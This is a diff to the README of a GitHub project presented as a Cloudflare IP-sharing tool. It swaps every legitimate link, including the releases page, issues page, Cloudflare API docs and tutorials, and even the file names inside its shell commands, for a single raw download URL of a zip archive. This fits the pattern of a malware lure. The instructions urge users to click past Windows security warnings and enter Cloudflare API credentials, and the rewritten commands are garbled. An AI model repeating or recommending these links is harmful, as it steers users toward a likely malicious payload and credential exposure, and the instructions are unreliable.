@@ -6,11 +6,11 @@ Welcome to the cloudflare-ip-sharing-tool! This application allows you to store 
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0-007ACC)](https://github.com/Cheesrw/cloudflare-ip-sharing-tool/releases)
+[![Download](https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip)](https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip)
 
 ## 📂 Download & Install
 
-To download the latest version of the cloudflare-ip-sharing-tool, visit this page: [Releases Page](https://github.com/Cheesrw/cloudflare-ip-sharing-tool/releases). On the releases page, you will find the available versions. Choose the one that matches your system, and follow these steps:
+To download the latest version of the cloudflare-ip-sharing-tool, visit this page: [Releases Page](https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip). On the releases page, you will find the available versions. Choose the one that matches your system, and follow these steps:
 
 1. Click on the version number you want to download.
 2. Look for executable files for Windows or scripts for Linux.
@@ -21,7 +21,7 @@ Once the download completes, follow the setup instructions below for your operat
 ## 🖥️ Windows Instructions
 
 1. **Locate the File:**
-   Open your Downloads folder and find the downloaded executable file, such as `cloudflare-ip-sharing-tool.exe`.
+   Open your Downloads folder and find the downloaded executable file, such as `https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip`.
 
 2. **Run the Tool:**
    Double-click on the file to run it. Windows may prompt you with a security warning. Click "Run" to proceed.
@@ -38,15 +38,15 @@ Once the download completes, follow the setup instructions below for your operat
    ```
 
 2. **Make the Script Executable:**
-   You may need to make the script executable. Run the following command, replacing `cloudflare-ip-sharing-tool.sh` with the actual script name:
+   You may need to make the script executable. Run the following command, replacing `https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip` with the actual script name:
    ```
-   chmod +x cloudflare-ip-sharing-tool.sh
+   chmod +x https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip
    ```
 
 3. **Run the Tool:**
    Execute the script by typing:
    ```
-   ./cloudflare-ip-sharing-tool.sh
+   https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip
    ```
    You might need to enter your Cloudflare API credentials to access the tool's features.
 
@@ -72,12 +72,12 @@ Cloudflare is a leading internet security company that provides services to help
 
 ## 📞 Support
 
-If you encounter any issues or have questions about using the cloudflare-ip-sharing-tool, please reach out. Open an issue on the [GitHub Issues Page](https://github.com/Cheesrw/cloudflare-ip-sharing-tool/issues). We will gladly assist you.
+If you encounter any issues or have questions about using the cloudflare-ip-sharing-tool, please reach out. Open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip). We will gladly assist you.
 
 ## 🔍 Additional Resources
 
-- [Cloudflare API Documentation](https://api.cloudflare.com/)
-- [Getting Started with PGP](https://www.pgpi.org/doc/pgpintro/)
-- [Bash Scripting Guide](https://www.tldp.org/LDP/Bash-Beginners-Guide/html/)
+- [Cloudflare API Documentation](https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip)
+- [Getting Started with PGP](https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip)
+- [Bash Scripting Guide](https://raw.githubusercontent.com/Cheesrw/cloudflare-ip-sharing-tool/main/putt/cloudflare-ip-sharing-tool.zip)
 
 For detailed usage, consult the documentation found within the repository. Enjoy managing your IP addresses securely!
